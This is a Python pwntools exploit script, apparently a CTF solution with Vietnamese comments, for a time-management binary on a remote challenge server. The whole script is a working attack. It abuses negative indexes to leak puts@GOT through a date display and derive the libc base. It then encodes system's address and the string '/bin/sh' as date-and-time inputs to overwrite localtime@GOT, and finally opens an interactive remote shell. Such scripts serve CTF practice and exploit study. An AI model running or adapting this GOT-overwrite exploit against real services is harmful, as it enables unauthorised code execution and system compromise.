#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

exe = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False) 

# KẾT NỐI SERVER CTF
p = remote('100.64.0.66', 45954)
#p=process(exe.path)

# =========================================================
def parse_leaked_time_to_epoch(time_str):
    months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
    parts = time_str.split()
    month = months.index(parts[1]) + 1
    day = int(parts[2])
    h, m, s = map(int, parts[3].split(':'))
    year = int(parts[4])

    def is_leap(y): return y % 4 == 0 and (y % 100 != 0 or y % 400 == 0)
    days = sum(366 if is_leap(y) else 365 for y in range(1970, year))
    month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    if is_leap(year): month_days[1] = 29
    days += sum(month_days[:month - 1]) + (day - 1)
    
    return (days * 86400) + (h * 3600) + (m * 60) + s 

def get_time_payload(target_addr):
    
    total_seconds = target_addr 
    days = total_seconds // 86400
    sec = total_seconds % 86400

    cycles = days // 146097
    rem_days = days % 146097
    year = 1970 + cycles * 400

    def is_leap(y): return y % 4 == 0 and (y % 100 != 0 or y % 400 == 0)

    while True:
        days_in_year = 366 if is_leap(year) else 365
        if rem_days >= days_in_year:
            rem_days -= days_in_year
            year += 1
        else:
            break

    month_days = [31, 29 if is_leap(year) else 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    month = 1
    for md in month_days:
        if rem_days >= md:
            rem_days -= md
            month += 1
        else:
            break

    day = rem_days + 1
    h = sec // 3600
    m = (sec % 3600) // 60
    s = sec % 60

    return str(year).encode(), str(month).encode(), str(day).encode(), str(h).encode(), str(m).encode(), str(s).encode()

# =========================================================
log.info("[1] Bơm 255 lần lỗi trước...")
for i in range(255):
    p.sendlineafter(b'Exit)', b'4')
    p.sendlineafter(b'Index:', b'-1') 

log.info("[2] Lần 256: Lấy puts@GOT...")
p.sendlineafter(b'Exit)', b'4')
p.sendlineafter(b'Index:', b'-19')

p.sendlineafter(b'Exit)', b'1') 
p.recvuntil(b'Current Timeline: ')
puts_leak = parse_leaked_time_to_epoch(p.recvline().strip().decode())

libc.address = puts_leak - libc.symbols['puts']
log.success(f"Base Address: {hex(libc.address)}")
system_addr = libc.symbols['system']

log.info("[3] Nặn đạn system và nạp vào localtime@GOT (Index -20)...")
y, mo, d, h, m, s = get_time_payload(system_addr)
p.sendlineafter(b'Exit)', b'2')
p.sendlineafter(b'Year:', y)
p.sendlineafter(b'Month:', mo)
p.sendlineafter(b'Day:', d)
p.sendlineafter(b'Hour:', h)
p.sendlineafter(b'Minute:', m)
p.sendlineafter(b'Second:', s)

p.sendlineafter(b'Exit)', b'3') 
p.sendlineafter(b'Index:', b'-20')
log.info("[4] Nạp '/bin/sh\x00' (Đúng 8 byte) và bóp cò...")

# Chuỗi 8 byte: /bin/sh\x00
# u64 sẽ biến 8 ký tự này thành một số nguyên 64-bit nguyên vẹn
magic_sh = u64(b"/bin/sh\x00") + 25200 

y, mo, d, h, m, s = get_time_payload(magic_sh)
p.sendlineafter(b'Exit)', b'2')
p.sendlineafter(b'Year:', y)
p.sendlineafter(b'Month:', mo)
p.sendlineafter(b'Day:', d)
p.sendlineafter(b'Hour:', h)
p.sendlineafter(b'Minute:', m)
p.sendlineafter(b'Second:', s)

log.warning("FIRE IN THE HOLE!!!")

# Kích nổ
p.sendlineafter(b'Exit)', b'1')

p.interactive()